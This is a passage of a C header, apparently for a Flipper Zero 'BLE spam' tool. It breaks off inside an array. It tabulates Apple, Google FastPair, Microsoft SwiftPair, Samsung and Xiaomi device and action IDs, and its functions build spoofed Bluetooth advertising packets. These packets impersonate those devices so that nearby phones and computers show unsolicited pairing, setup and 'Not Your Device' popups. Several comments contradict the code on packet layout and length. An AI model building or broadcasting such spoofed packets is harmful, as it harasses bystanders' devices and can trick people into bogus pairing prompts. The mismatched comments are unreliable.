#pragma once

#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <furi_hal_random.h>

// ---------------------------------------------------------------------------
// 1. Apple Continuity -- Device Popup (ProximityPair)
// ---------------------------------------------------------------------------

typedef struct {
    const char* name;
    uint16_t device_id;
} BleSpamAppleDevice;

static const BleSpamAppleDevice apple_devices[] = {
    {"AirPods Pro",                 0x0E20},
    {"AirPods Pro 2nd Gen",         0x1420},
    {"AirPods Pro 2nd Gen USB-C",   0x2420},
    {"AirPods 4 ANC",               0x2820},
    {"AirPods 4",                   0x2920},
    {"AirPods Max USB-C",           0x2B20},
    {"Beats Powerbeats Pro 2",      0x2C20},
    {"Beats Solo 3",                0x0620},
    {"AirPods Max",                 0x0A20},
    {"Beats Flex",                  0x1020},
    {"AirTag",                      0x0055},
    {"Hermes AirTag",               0x0030},
    {"AirPods",                     0x0220},
    {"AirPods 2nd Gen",             0x0F20},
    {"AirPods 3rd Gen",             0x1320},
    {"Powerbeats 3",                0x0320},
    {"Powerbeats Pro",              0x0B20},
    {"Beats Solo Pro",              0x0C20},
    {"Beats Studio Buds",           0x1120},
    {"Beats X",                     0x0520},
    {"Beats Studio 3",              0x0920},
    {"Beats Studio Pro",            0x1720},
    {"Beats Fit Pro",               0x1220},
    {"Beats Studio Buds+",          0x1620},
    {"Beats Solo 4",                0x2520},
    {"Beats Solo Buds",             0x2620},
    {"Powerbeats Fit",              0x2F20},
};

#define APPLE_DEVICE_COUNT (sizeof(apple_devices) / sizeof(apple_devices[0]))

// ---------------------------------------------------------------------------
// 2. Apple Continuity -- NearbyAction (Action Modal)
// ---------------------------------------------------------------------------

typedef struct {
    const char* name;
    uint8_t action_id;
    uint8_t flags;
} BleSpamAppleAction;

static const BleSpamAppleAction apple_actions[] = {
    {"AppleTV AutoFill",           0x13, 0xC0},
    {"AppleTV Connecting...",      0x27, 0xC0},
    {"Join This AppleTV?",         0x20, 0xC0},
    {"AppleTV Audio Sync",         0x19, 0xC0},
    {"AppleTV Color Balance",      0x1E, 0xC0},
    {"Setup New iPhone",           0x09, 0xC0},
    {"Transfer Phone Number",      0x02, 0xC0},
    {"HomePod Setup",              0x0B, 0xC0},
    {"Setup New AppleTV",          0x01, 0xC0},
    {"Pair AppleTV",               0x06, 0xC0},
    {"HomeKit AppleTV Setup",      0x0D, 0xC0},
    {"AppleID for AppleTV?",       0x2B, 0xC0},
    {"Apple Watch",                0x05, 0xC0},
    {"Apple Vision Pro",           0x24, 0xC0},
    {"Connect to other Device",    0x2F, 0xC0},
    {"Software Update",            0x21, 0x40},
    {"Unlock with Apple Watch",    0x2E, 0xC0},
    {"AirDrop Sidecar",            0x25, 0xC0},
    {"Vision Pro Setup",           0x2C, 0xC0},
};

#define APPLE_ACTION_COUNT (sizeof(apple_actions) / sizeof(apple_actions[0]))

// ---------------------------------------------------------------------------
// 3. Google FastPair model IDs  (455 entries)
// ---------------------------------------------------------------------------

static const uint32_t fastpair_models[] = {
    0x72EF8D, 0x0E30C3, 0x00000D, 0x000007, 0x070000, 0x000008, 0x080000,
    0x000009, 0x090000, 0x00000B, 0x0A0000, 0x0B0000, 0x0C0000, 0x060000,
    0x000048, 0x000049, 0x480000, 0x490000, 0x000035, 0x350000, 0x001000,
    0x002000, 0x003000, 0x003001, 0x470000, 0xF00000, 0xF00400, 0x003B41,
    0x003D8A, 0x005BC3, 0x008F7D, 0x00A168, 0x00AA48, 0x00AA91, 0x00B727,
    0x00C95C, 0x00FA72, 0x0100F0, 0x011242, 0x013D8A, 0x01AA91, 0x01C95C,
    0x01E5CE, 0x01EEB4, 0x0200F0, 0x02AA91, 0x02C95C, 0x02D815, 0x02E2A9,
    0x035754, 0x035764, 0x038B91, 0x038F16, 0x039F8F, 0x03AA91, 0x03B716,
    0x03C95C, 0x03C99C, 0x03F5D4, 0x045754, 0x045764, 0x04AA91, 0x04C95C,
    0x050F0C, 0x052CC7, 0x0577B1, 0x057802, 0x0582FD, 0x058D08, 0x05A963,
    0x05A9BC, 0x05AA91, 0x05C95C, 0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC,
    0x0744B6, 0x07A41C, 0x07C95C, 0x07F426, 0xF00200, 0x0102F0, 0xF00201,
    0x0202F0, 0xF00202, 0x0302F0, 0xF00203, 0x0402F0, 0xF00204, 0x0502F0,
    0xF00205, 0x0602F0, 0xF00206, 0x0702F0, 0xF00207, 0x0802F0, 0xF00208,
    0xF00209, 0xF0020A, 0xF0020B, 0xF0020C, 0xF0020D, 0xF0020E, 0xF0020F,
    0xF00210, 0xF00211, 0xF00212, 0xF00213, 0xF00214, 0xF00215, 0x02D886,
    0x02DD4F, 0x02F637, 0x038CC7, 0x04ACFC, 0x04AFB8, 0x054B2D, 0x05C452,
    0x0660D7, 0xF00300, 0x0003F0, 0xF00301, 0x0103F0, 0xF00302, 0x0203F0,
    0xF00303, 0x0303F0, 0xF00304, 0x0403F0, 0xF00305, 0x0503F0, 0xF00306,
    0x0603F0, 0xF00307, 0x0703F0, 0xF00308, 0x0803F0, 0xF00309, 0x0903F0,
    0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0xCD8256, 0xF52494, 0x718FA4,
    0x821F66, 0x92BBBD, 0xD446A7, 0x2D7A23, 0x72FB00, 0x00000A, 0x0001F0,
    0x000047, 0x000006, 0x0000F0, 0x0003F0, 0xDAE096, 0xA83C10, 0x9B7339,
    0x202B3D, 0x02D815, 0x1EE890, 0xE6E771, 0xCAB6B8, 0x9C3997, 0x9939BC,
    0xD7102F, 0xCA7030, 0x05AA91, 0x91AA05, 0x03AA91, 0x91AA03, 0x02AA91,
    0x91AA02, 0x038F16, 0x00AA91, 0x91AA00, 0xD6E870, 0x04AA91, 0x91AA04,
    0x01AA91, 0x91AA01, 0x109201, 0xDF271C, 0x532011, 0xDA5200, 0x0052DA,
    0x124366, 0x8D13B9, 0x1F5865, 0x641630, 0x8E5550, 0x21521D, 0xA7E52B,
    0xDF9BA4, 0x5BACD6, 0x8A31B7, 0xDADE43, 0x013D8A, 0x8A3D01, 0x8A3D00,
    0x003D8A, 0xD7E3EB, 0x0F0993, 0x213C8C, 0xDEE8C0, 0x9CE3C7, 0x994374,
    0x0DEC2B, 0xC7A267, 0x5CEE3C, 0x915CFA, 0x89BAD5, 0x8E1996, 0xA8CAAD,
    0x8D16EA, 0x9D7D42, 0xE4E457, 0x99F098, 0x8C4236, 0x9B9872, 0xDAD3A6,
    0x6BA5C3, 0x8C07D2, 0xDA4577, 0x8B0A91, 0xD5A59E, 0x9171BE, 0xC79B91,
    0xE750CE, 0xC8777E, 0xCAF511, 0xA8001A, 0xA7EF76, 0xD933A7, 0xC85D7A,
    0xA8F96D, 0x6C4DE5, 0x8CB05C, 0xC6936A, 0xA8A72A, 0xC7D620, 0xDFD433,
    0xE69877, 0x9B735A, 0xD9414F, 0x664454, 0xA8E353, 0xE09172, 0x0F232A,
    0x5BD6C9, 0x5C0C84, 0x9BC64D, 0x9C98DB, 0xA9394A, 0xA8C636, 0xCC5F29,
    0xD9964B, 0x9C0AF7, 0xC7FBCC, 0xA92498, 0x549547, 0xC9836A, 0xD654CD,
    0x9CF08F, 0x8AADAE, 0x8CAD81, 0x91BD38, 0x9AEEA4, 0xD6C195, 0x9CD0F3,
    0x5C4A7E, 0xDB8AC7, 0x92255E, 0x625740, 0x8E14D7, 0x917E46, 0x861698,
    0x1F181A, 0x9C6BC0, 0xC8162A, 0xE06116, 0xCCBB7E, 0xD8058C, 0x596007,
    0x9A408A, 0xD5B5F7, 0x0DC6BF, 0x855347, 0xA8A00E, 0x6B9304, 0x8BB0A0,
    0x8E4666, 0xE57363, 0x8BF79A, 0xE07634, 0x6B8C65, 0xA8845A, 0x21A04E,
    0x614199, 0x99D7EA, 0xD65F4E, 0xC7736C, 0x0ECE95, 0x8D5B67, 0x8B66AB,
    0x9ADB11, 0xC8E228, 0xD87A3E, 0x567679, 0x284500, 0xE6E8B8, 0x8C6B6A,
    0x8CD10F, 0xD8F4E8, 0xD5C6CE, 0xD6EE84, 0xA8658F, 0x989D0A, 0xE64CC6,
    0x5CC938, 0x5CC939, 0x5CC93A, 0x5CC93B, 0x5CC91E, 0x5CC91F, 0x5CC920,
    0x5CC921, 0x5CC922, 0x5CC923, 0x5CC924, 0x5CC925, 0x5CC926, 0x5CC927,
    0x0DC95C, 0x5CC90A, 0x5CC90B, 0x5CC90C, 0x5CC90D, 0x706908, 0x837980,
    0x5CC932, 0x5CC933, 0x5CC934, 0x5CC935, 0x5CC936, 0x5CC937, 0x5CC928,
    0x5CC929, 0x5CC92A, 0x5CC92B, 0x5CC92C, 0x5CC92D, 0x5CC92E, 0x5CC92F,
    0x5CC930, 0x5CC931, 0x5CC93C, 0x5CC93D, 0x5CC93E, 0x5CC93F, 0x5CC940,
    0x5CC941, 0x5CC942, 0x5CC943, 0x5CC944, 0x5CC945, 0x0EC95C, 0x5CC90E,
    0x5CC90F, 0x5CC910, 0x5CC911, 0x5CC912, 0x5CC913, 0x5CC914, 0x5CC915,
    0x5CC916, 0x5CC917, 0x5CC918, 0x5CC919, 0x5CC91A, 0x5CC91B, 0x5CC91C,
    0x5CC91D, 0xCB529D, 0x9CB881, 0xE020C1, 0xCB2FE7, 0xDEDD6F, 0xDA0F83,
    0xDF4B02, 0x91DABC, 0xE5B91B, 0x20CC2C, 0xC6EC5F, 0x9CEFD1, 0xC878AA,
    0xDEC04C, 0xE57B57, 0xCC93A5, 0xDF01E3, 0xDF42DE, 0x9128CB, 0xDE577F,
    0x6AD226, 0x8B5A7B, 0xD69B2B, 0x6C42C0, 0x997B4A, 0xC6ABEA, 0x5C0206,
    0x9D00A6, 0xCB093B, 0x8A8F23, 0xE5B4B0, 0xDE215D, 0xC69AFD, 0x0E138D,
    0x20A19B, 0x5BA9B5, 0xA88B69, 0x5C7CDC, 0x9CB5F3, 0xD8F3BA, 0x0F2D16,
    0x5C4833, 0x99C87B, 0xDC5249, 0xDEF234, 0x9C888B, 0x9A9BDD, 0xD820EA,
    0x1E955B, 0x9BE931, 0xDEEA86, 0xD90617, 0xC8C641, 0x612907, 0x913B0C,
    0x9DB896, 0x8C1706, 0xE5E2E9, 0x00000C, 0x0577B1, 0x05A9BC, 0xDA9B43,
    0xE6B2D4, 0x9B4B6A, 0xA7C128, 0xB8D241, 0xC9E352, 0xF1A234, 0xD2B345,
};

#define FASTPAIR_MODEL_COUNT (sizeof(fastpair_models) / sizeof(fastpair_models[0]))

// ---------------------------------------------------------------------------
// 4. Microsoft SwiftPair -- Normal device names
// ---------------------------------------------------------------------------

static const char* swiftpair_names[] = {
    "Windows Protocol",
    "DLL Missing",
    "Download Windows 12",
    "Microsoft Bluetooth Keyboard",
    "Microsoft Arc Mouse",
    "Microsoft Surface Ergonomic Keyboard",
    "Microsoft Surface Precision Mouse",
    "Microsoft Modern Mobile Mouse",
    "Microsoft Surface Mobile Mouse",
    "Microsoft Surface Headphones",
    "Microsoft Surface Laptop",
    "Microsoft Surface Pro",
    "Microsoft Surface Duo",
    "Microsoft Xbox Wireless Controller",
    "Microsoft Surface Earbuds",
    "Microsoft Surface Go",
    "Microsoft Surface Studio",
    "Microsoft Surface Book",
    "Microsoft Surface Hub",
    "Microsoft Surface Pen",
    "Microsoft Surface Dial",
    "Microsoft Surface Slim Pen",
    "Microsoft Surface Dock",
    "Microsoft Surface Thunderbolt Dock",
    "Microsoft Surface Audio",
    "Free VPN",
    "Your Mom's PC",
    "Your Dad's iPhone",
    "404 Device Not Found",
    "Blue Screen of Death",
    "Installing Windows 99...",
    "Virus.exe",
    "Trojan Horse",
    "Neighbor's Wi-Fi",
    "Pirated Windows",
    "Keyboard for Cats",
    "Mouse for Dogs",
    "Pizza Delivery Drone",
    "Smart Fridge",
    "Smart Light Bulb",
    "RoboVac 3000",
    "Google Eye",
    "Apple iPot",
    "Samsung Smart Toaster",
    "PlayStation 10",
    "Xbox Infinite",
    "Nintendo Switch Pro Max",
    "AI Calculator",
    "Time Travel Watch",
    "Cyber Sock",
    "USB Breadbox",
    "Bluetooth Fork",
    "Wi-Fi Toothbrush",
    "Quantum Toaster",
    "Meme Dispenser",
    "Hello by ars3nb",
    "Hello by ars2nb",
};

#define SWIFTPAIR_NAME_COUNT (sizeof(swiftpair_names) / sizeof(swiftpair_names[0]))

// ---------------------------------------------------------------------------
// 5. Microsoft SwiftPair -- Headphone device names
// ---------------------------------------------------------------------------

static const char* swiftpair_headphone_names[] = {
    "Ars3nb HP",
    "BT Headset",
    "Stereo HP",
    "Wireless HP",
    "Audio HP",
    "Music HP",
    "Sound HP",
    "Bass HP",
    "BT Audio",
    "BT Stereo",
    "Air HP",
    "Mini HP",
    "Pro HP",
    "Ultra HP",
    "Max HP",
    "Lite HP",
    "Neo HP",
    "Echo HP",
    "Pulse HP",
    "Wave HP",
    "Noise HP",
    "Clear HP",
    "Prime HP",
    "Core HP",
    "Flex HP",
    "Zoom HP",
    "Sync HP",
    "Nova HP",
    "Aura HP",
    "Spark HP",
};

#define SWIFTPAIR_HEADPHONE_COUNT (sizeof(swiftpair_headphone_names) / sizeof(swiftpair_headphone_names[0]))

// ---------------------------------------------------------------------------
// 6. Samsung Easy Setup -- Buds (3-byte color as R, G, B)
// ---------------------------------------------------------------------------

typedef struct {
    const char* name;
    uint8_t r;
    uint8_t g;
    uint8_t b;
} BleSpamSamsungBuds;

static const BleSpamSamsungBuds samsung_buds[] = {
    {"Fallback Buds",           0xEE, 0x7A, 0x0C},
    {"Fallback Dots",           0x9D, 0x17, 0x00},
    {"Light Purple Buds2",      0x39, 0xEA, 0x48},
    {"Bluish Silver Buds2",     0xA7, 0xC6, 0x2C},
    {"Black Buds Live",         0x85, 0x01, 0x16},
    {"Gray & Black Buds2",      0x3D, 0x8F, 0x41},
    {"Bluish Chrome Buds2",     0x3B, 0x6D, 0x02},
    {"Gray Beige Buds2",        0xAE, 0x06, 0x3C},
    {"Pure White Buds",         0xB8, 0xB9, 0x05},
    {"Pure White Buds2",        0xEA, 0xAA, 0x17},
    {"Black Buds",              0xD3, 0x07, 0x04},
    {"French Flag Buds",        0x9D, 0xB0, 0x06},
    {"Dark Purple Buds Live",   0x10, 0x1F, 0x1A},
    {"Dark Blue Buds",          0x85, 0x96, 0x08},
    {"Pink Buds",               0x8E, 0x45, 0x03},
    {"White & Black Buds2",     0x2C, 0x67, 0x40},
    {"Bronze Buds Live",        0x3F, 0x67, 0x18},
    {"Red Buds Live",           0x42, 0xC5, 0x19},
    {"Black & White Buds2",     0xAE, 0x07, 0x3A},
    {"Sleek Black Buds2",       0x01, 0x17, 0x16},
    {"Ocean Blue Buds",         0x12, 0x34, 0x56},
    {"Forest Green Buds",       0x65, 0x43, 0x21},
    {"Sunset Orange Buds",      0x78, 0x9A, 0xBC},
    {"Midnight Black Buds",     0xDE, 0xF1, 0x23},
    {"Rose Gold Buds",          0x45, 0x67, 0x89},
    {"Electric Yellow Buds",    0xAB, 0xC1, 0x23},
    {"Crimson Red Buds",        0x32, 0x16, 0x54},
    {"Arctic White Buds",       0x98, 0x76, 0x54},
    {"Mystic Purple Buds",      0x65, 0x49, 0x87},
    {"Golden Buds",             0x32, 0x19, 0x87},
};

#define SAMSUNG_BUDS_COUNT (sizeof(samsung_buds) / sizeof(samsung_buds[0]))

// ---------------------------------------------------------------------------
// 7. Samsung Easy Setup -- Watch
// ---------------------------------------------------------------------------

typedef struct {
    const char* name;
    uint8_t watch_id;
} BleSpamSamsungWatch;

static const BleSpamSamsungWatch samsung_watches[] = {
    {"Fallback Watch",                  0x1A},
    {"White Watch4 Classic 44m",        0x01},
    {"Black Watch4 Classic 40m",        0x02},
    {"White Watch4 Classic 40m",        0x03},
    {"Black Watch4 44mm",               0x04},
    {"Silver Watch4 44mm",              0x05},
    {"Green Watch4 44mm",               0x06},
    {"Black Watch4 40mm",               0x07},
    {"White Watch4 40mm",               0x08},
    {"Gold Watch4 40mm",                0x09},
    {"French Watch4",                   0x0A},
    {"French Watch4 Classic",           0x0B},
    {"Fox Watch5 44mm",                 0x0C},
    {"Black Watch5 44mm",               0x11},
    {"Sapphire Watch5 44mm",            0x12},
    {"Purplish Watch5 40mm",            0x13},
    {"Gold Watch5 40mm",                0x14},
    {"Black Watch5 Pro 45mm",           0x15},
    {"Gray Watch5 Pro 45mm",            0x16},
    {"White Watch5 44mm",               0x17},
    {"White & Black Watch5",            0x18},
    {"Black Watch6 Pink 40mm",          0x1B},
    {"Gold Watch6 Gold 40mm",           0x1C},
    {"Silver Watch6 Cyan 44mm",         0x1D},
    {"Black Watch6 Classic 43m",        0x1E},
    {"Green Watch6 Classic 43m",        0x20},
    {"Midnight Black Watch6",           0x21},
    {"Ocean Blue Watch6",               0x22},
    {"Rose Gold Watch6",                0x23},
    {"Electric Yellow Watch6",          0x24},
    {"Crimson Red Watch6",              0x25},
    {"Arctic White Watch6",             0x26},
    {"Mystic Purple Watch6",            0x27},
    {"Golden Watch6",                   0x28},
    {"Forest Green Watch6",             0x29},
    {"Sunset Orange Watch6",            0x2A},
    {"Black Galaxy Watch7 44mm",        0x30},
    {"Green Galaxy Watch7 44mm",        0x31},
    {"Cream Galaxy Watch7 40mm",        0x32},
    {"Green Galaxy Watch7 40mm",        0x33},
    {"White Galaxy Watch7 Classic",     0x34},
    {"Black Galaxy Watch7 Classic",     0x35},
    {"Titanium White Watch Ultra",      0x40},
    {"Titanium Black Watch Ultra",      0x41},
    {"Titanium Silver Watch Ultra",     0x42},
    {"Black Galaxy Ring",               0x60},
    {"Gold Galaxy Ring",                0x61},
    {"Silver Galaxy Ring",              0x62},
};

#define SAMSUNG_WATCH_COUNT (sizeof(samsung_watches) / sizeof(samsung_watches[0]))

// ===========================================================================
//  Builder functions -- construct raw BLE advertising data
// ===========================================================================

/**
 * Apple ProximityPair (Device Popup).
 *
 * Layout (31 bytes total -- max legacy ADV):
 *   [0..2]   02 01 06                       -- AD Flags
 *   [3..6]   1B FF 4C 00                    -- Manuf. header (len=27, Apple)
 *   [7]      07                             -- Continuity: ProximityPair
 *   [8]      19                             -- Payload size (25)
 *   [9]      07                             -- Prefix: 0x07 = new device
 *   [10..11] DEV_HI DEV_LO                  -- Device ID big-endian
 *   [12]     55                             -- Status
 *   [13..15] BATT_3B                        -- Random battery bytes
 *   [16]     00                             -- Color (always 0 for new device)
 *   [17]     00                             -- Reserved
 *   [18..30] RANDOM_13B + padding           -- Random tail (16 bytes from [15])
 *
 * Returns: 31
 */
static inline uint8_t ble_spam_build_apple_proximity(uint8_t* buf, uint16_t device_id) {
    uint8_t i = 0;
    /* Manufacturer Specific Data: length=0x1E (30 = following bytes), type=0xFF, Apple=0x004C LE */
    buf[i++] = 0x1E; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
    /* Continuity type: ProximityPair */
    buf[i++] = 0x07;
    /* Payload size */
    buf[i++] = 0x19;
    /* Prefix: 0x07 = new device popup */
    buf[i++] = 0x07;
    /* Device ID (big-endian) */
    buf[i++] = (uint8_t)(device_id >> 8);
    buf[i++] = (uint8_t)(device_id & 0xFF);
    /* Status byte */
    buf[i++] = 0x55;
    /* Random battery (3 bytes) */
    furi_hal_random_fill_buf(&buf[i], 3); i += 3;
    buf[i++] = 0x00; /* color */
    buf[i++] = 0x00; /* reserved */
    furi_hal_random_fill_buf(&buf[i], 16); i += 16;
    return i; /* 31 */
}

/**
 * Apple "Not Your Device" popup.
 *
 * Same as ProximityPair but prefix byte [9] = 0x01 instead of 0x07,
 * which triggers the "Not Your Device" variant on iPhones.
 *
 * Returns: 31
 */
static inline uint8_t ble_spam_build_apple_not_your_device(uint8_t* buf, uint16_t device_id) {
    uint8_t len = ble_spam_build_apple_proximity(buf, device_id);
    buf[6] = 0x01; /* Not Your Device prefix (offset shifted -3 without flags) */
    return len;
}

/**
 * Apple NearbyAction (Action Modal).
 *
 * Layout (~14 bytes):
 *   [0..2]   02 01 06                       -- AD Flags
 *   [3..6]   0A FF 4C 00                    -- Manuf. header (len=10, Apple)
 *   [7]      0F                             -- Continuity: NearbyAction
 *   [8]      05                             -- Payload size (5)
 *   [9]      FLAGS                          -- Action flags (0xC0 default)
 *   [10]     ACTION_ID                      -- Action identifier
 *   [11..13] RANDOM_3B                      -- Auth tag
 *
 * Returns: 14
 */
static inline uint8_t ble_spam_build_apple_nearby_action(
    uint8_t* buf,
    uint8_t action_id,
    uint8_t flags) {
    uint8_t i = 0;
    /* Manufacturer Specific Data: length=0x0A (10), type=0xFF, Apple=0x004C LE */
    buf[i++] = 0x0A; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
    /* Continuity type: NearbyAction */
    buf[i++] = 0x0F;
    /* Payload size */
    buf[i++] = 0x05;
    /* Flags & action */
    buf[i++] = flags;
    buf[i++] = action_id;
    /* Random auth tag */
    furi_hal_random_fill_buf(&buf[i], 3); i += 3;
    return i; /* 11 */
}

/**
 * Google FastPair.
 * Matches CustomBLESpam payload format exactly.
 *
 * Layout (14 bytes, no flags — matches Flipper extra_beacon format):
 *   [0..3]   03 03 2C FE                    -- Complete List of 16-bit Service UUIDs: 0xFE2C
 *   [4..10]  06 16 2C FE M2 M1 M0           -- Service Data (UUID=0xFE2C LE + 3-byte model)
 *   [11..13] 02 0A TX                       -- TX Power Level (random -100..+19)
 *
 * Returns: 14
 */
static inline uint8_t ble_spam_build_fastpair(uint8_t* buf, uint32_t model_id) {
    uint8_t i = 0;
    /* Complete List of 16-bit Service UUIDs: 0xFE2C */
    buf[i++] = 0x03; buf[i++] = 0x03; buf[i++] = 0x2C; buf[i++] = 0xFE;
    /* Service Data AD: length=6, type=0x16, UUID=0xFE2C little-endian */
    buf[i++] = 0x06;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    /* 3-byte model ID (big-endian) */
    buf[i++] = (uint8_t)((model_id >> 16) & 0xFF);
    buf[i++] = (uint8_t)((model_id >> 8)  & 0xFF);
    buf[i++] = (uint8_t)( model_id        & 0xFF);
    /* TX Power Level (random, matching CustomBLESpam: rand()%120 - 100) */
    buf[i++] = 0x02;
    buf[i++] = 0x0A;
    uint8_t rnd;
    furi_hal_random_fill_buf(&rnd, 1);
    buf[i++] = (uint8_t)((rnd % 120) - 100);
    return i;
}

/**
 * Microsoft SwiftPair -- Normal device.
 *
 * Layout:
 *   [0..2]   02 01 06                       -- AD Flags
 *   [3]      LEN                            -- Manuf. AD length
 *   [4]      FF                             -- AD type: Manufacturer Specific
 *   [5..6]   06 00                          -- Microsoft company ID (0x0006 LE)
 *   [7..9]   03 00 80                       -- SwiftPair beacon + normal flag
 *   [10..]   NAME_BYTES                     -- UTF-8 device name
 *
 * Returns: 10 + strlen(name)
 */
static inline uint8_t ble_spam_build_swiftpair(uint8_t* buf, const char* name) {
    size_t name_len = strlen(name);
    if(name_len > 24) name_len = 24;
    uint8_t i = 0;
    buf[i++] = (uint8_t)(name_len + 6);
    buf[i++] = 0xFF;
    buf[i++] = 0x06; buf[i++] = 0x00;
    buf[i++] = 0x03; buf[i++] = 0x00; buf[i++] = 0x80;
    memcpy(&buf[i], name, name_len); i += name_len;
    return i;
}

/**
 * Microsoft SwiftPair -- Headphone device.
 *
 * Layout:
 *   [0..2]   02 01 06                       -- AD Flags
 *   [3]      LEN                            -- Manuf. AD length
 *   [4]      FF                             -- AD type: Manufacturer Specific
 *   [5..6]   06 00                          -- Microsoft company ID (0x0006 LE)
 *   [7..18]  03 01 80 D7 2F D2 F4 61 E4 04 04 00  -- SwiftPair headphone header
 *   [19..]   NAME_BYTES                     -- UTF-8 device name
 *
 * Returns: 19 + strlen(name)
 */
static inline uint8_t ble_spam_build_swiftpair_headphone(uint8_t* buf, const char* name) {
    size_t name_len = strlen(name);
    if(name_len > 15) name_len = 15;
    uint8_t i = 0;
    buf[i++] = (uint8_t)(name_len + 15);
    buf[i++] = 0xFF;
    buf[i++] = 0x06; buf[i++] = 0x00;
    buf[i++] = 0x03; buf[i++] = 0x01; buf[i++] = 0x80;
    buf[i++] = 0xD7; buf[i++] = 0x2F; buf[i++] = 0xD2;
    buf[i++] = 0xF4; buf[i++] = 0x61; buf[i++] = 0xE4;
    buf[i++] = 0x04; buf[i++] = 0x04; buf[i++] = 0x00;
    memcpy(&buf[i], name, name_len); i += name_len;
    return i;
}

/**
 * Samsung Easy Setup -- Buds.
 *
 * Ghost/Flipper format (31 bytes): primary 28-byte manuf record + a trailing
 * truncated 2nd manuf record that Android's stack completes with zeros.
 * Without this trailer Android's Galaxy Wearable stack won't raise the popup.
 *
 * Returns: 31
 */
static inline uint8_t ble_spam_build_samsung_buds(uint8_t* buf, uint8_t r, uint8_t g, uint8_t b) {
    uint8_t i = 0;
    /* Primary record: length=27 (0x1B), manufacturer-specific Samsung */
    buf[i++] = 0x1B; buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
    buf[i++] = 0x42; buf[i++] = 0x09; buf[i++] = 0x81; buf[i++] = 0x02;
    buf[i++] = 0x14; buf[i++] = 0x15; buf[i++] = 0x03; buf[i++] = 0x21;
    buf[i++] = 0x01; buf[i++] = 0x09;
    buf[i++] = r; buf[i++] = g; buf[i++] = 0x01; buf[i++] = b;
    buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0xC7; buf[i++] = 0x00;
    /* Trailing truncated record: length=16 claimed, only 2 data bytes present */
    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75;
    return i; /* 31 */
}

/**
 * Samsung Easy Setup -- Watch.
 *
 * Layout (18 bytes):
 *   [0..2]   02 01 06                       -- AD Flags
 *   [3]      0E                             -- Manuf. AD length (14)
 *   [4]      FF                             -- AD type: Manufacturer Specific
 *   [5..6]   75 00                          -- Samsung company ID (0x0075 LE)
 *   [7..17]  01 00 02 00 01 01 FF 00 00 43 WATCH_ID  -- Watch payload
 *
 * Returns: 18
 */
static inline uint8_t ble_spam_build_samsung_watch(uint8_t* buf, uint8_t watch_id) {
    uint8_t i = 0;
    buf[i++] = 0x0E; buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
    buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x02; buf[i++] = 0x00;
    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0xFF; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x43;
    buf[i++] = watch_id;
    return i;
}

/**
 * Xiaomi QuickConnect.
 *
 * Layout (31 bytes):
 *   [0..2]   02 01 06                       -- AD Flags
 *   [3]      1B                             -- Manuf. AD length (27)
 *   [4]      FF                             -- AD type: Manufacturer Specific
 *   [5..6]   8F 03                          -- Xiaomi company ID (0x038F LE)
 *   [7..9]   16 01 20                       -- Prefix
 *   [10..11] RND RND                        -- Random 2 bytes
 *   [12..22] 17 0A 00 00 00 00 88 50 11 B1 FF  -- Middle constant
 *   [23..24] RND RND                        -- Random 2 bytes
 *   [25..30] 00 00 00 00 00 00              -- Suffix (6 zero bytes)
 *
 * Returns: 31
 */
static inline uint8_t ble_spam_build_xiaomi(uint8_t* buf) {
    uint8_t i = 0;
    buf[i++] = 0x1B; buf[i++] = 0xFF; buf[i++] = 0x8F; buf[i++] = 0x03;
    buf[i++] = 0x16; buf[i++] = 0x01; buf[i++] = 0x20;
    furi_hal_random_fill_buf(&buf[i], 2); i += 2;
    buf[i++] = 0x17; buf[i++] = 0x0A; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x88; buf[i++] = 0x50;
    buf[i++] = 0x11; buf[i++] = 0xB1; buf[i++] = 0xFF;
    furi_hal_random_fill_buf(&buf[i], 2); i += 2;
    memset(&buf[i], 0, 6); i += 6;
    return i; /* 28 */
}


static const char* pair_spam_device_names[] = {
    "Your Sister's Apple Watch",
    "Mom's iPad",
    "Dad's Headphones",
    "Neighbor's Doorbell",
    "Justin Bieber's Phone",
    "FBI Van WiFi",
    "Totally Not A Scam",
    "Free Bitcoin Wallet",
    "Government Tracking Device",
    "Space Laser Transmitter",
    "Aliens Communicator",
    "DeLorean Time Machine",
    "Mr. Whiskers' Collar",
    "Lost AirPods (Not Mine)",
    "Quantum Toaster",
    "Bathroom Scale",
    "Smart Fridge (Judgy)",
    "AI Pillow",
    "Self-Aware Microwave",
    "Sentient USB Cable",
    "Philosophical Doorbell",
    "Existential Crisis Hub",
    "Bluetooth Sock Matcher",
    "The Matrix Server",
    "Coffee Maker From Future",
    "Portal Gun Charger",
    "Rickroll Transmitter",
    "Rickroll Controller",
    "Hamster Wheel Tracker",
    "Rubber Duck Debugger",
    "Echo's Evil Twin",
    "Smart Rock",
    "AI Rubber Band",
    "Procrastination Device",
    "Motivation Booster",
    "WiFi Extender 2: The Sequel",
    "5G Microwave",
    "Cloud Storage IRL",
    "Bluetooth Soap Dispenser",
    "Smart Plant Whisperer",
    "AI Pet Rock",
    "Kitchen Gadget Simulator",
    "Weather Control Unit",
    "Interdimensional Portal",
    "Spice Rack AI",
    "Sentient Salad",
    "Philosophy Machine",
    "Regret Recorder",
    "Debt Simulator",
    "Cake Baking AI",
};

#define PAIR_SPAM_DEVICE_COUNT (sizeof(pair_spam_device_names) / sizeof(pair_spam_device_names[0]))

static const char* pair_spam_rickroll_names[] = {
    "Never Gonna Give You Up",
    "Rick Astley Bluetooth",
    "Never Gonna Let You Down",
    "Never Gonna Run Around",
    "Never Gonna Desert You",
    "Rickroll Device",
    "Uptown Funk Device",
    "Rickroll Remote",
    "Never Gonna Make You Cry",
